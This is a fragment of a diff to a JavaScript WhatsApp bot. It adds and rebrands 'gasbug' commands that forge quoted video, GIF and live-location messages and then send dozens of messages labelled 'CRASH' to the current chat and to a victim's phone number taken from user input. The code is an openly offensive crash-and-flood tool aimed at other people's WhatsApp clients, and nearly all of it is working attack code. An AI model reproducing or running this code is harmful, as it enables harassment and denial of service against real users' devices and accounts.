+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc1})
 await m.reply(`Succes`)
 break
 case 'gasbug4':
@@ -6189,71 +5863,41 @@ message: { "videoMessage": {
 "title":"hallo bang","h": 
 `Hmm`,'seconds': '359996400', 
 'gifPlayback': 'true', 
-'caption': `𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+'caption': `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
 }
 }
 }
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fgif1})
 await m.reply(`Succes`)
 break 
 case 'gasbug5':
@@ -6265,71 +5909,41 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 liveLocationMessage: {
-caption: `𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍`,
+caption: `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`,
 jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
 }
 }
 }
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
-haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:floc1})
